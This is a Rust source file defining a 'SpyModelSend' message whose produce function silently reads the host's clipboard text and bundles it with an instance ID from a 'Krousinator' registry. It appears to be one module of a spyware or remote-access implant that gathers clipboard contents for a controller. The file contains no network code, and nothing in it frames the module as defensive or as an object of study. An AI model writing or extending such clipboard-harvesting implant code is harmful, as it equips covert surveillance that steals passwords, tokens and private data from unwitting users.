use serde::{Serialize, Deserialize};
use super::producer::Producer;
use arboard::Clipboard;
use crate::registry::krousinator_interface::KrousinatorInterface;

#[derive(Debug, Serialize, Deserialize)]
pub struct SpyModelSend {
    _t:  &'static str,
    uuid: String,
    clipboard: String
}

impl Producer for SpyModelSend {
    fn produce(krousinator_instance_data: &KrousinatorInterface) -> Self {
        let mut clipboard = Clipboard::new().unwrap();
        let text = clipboard.get_text().unwrap();
        Self { _t: "SpyModelSend", uuid: krousinator_instance_data.get_uuid(), clipboard: text}
        
    }
}

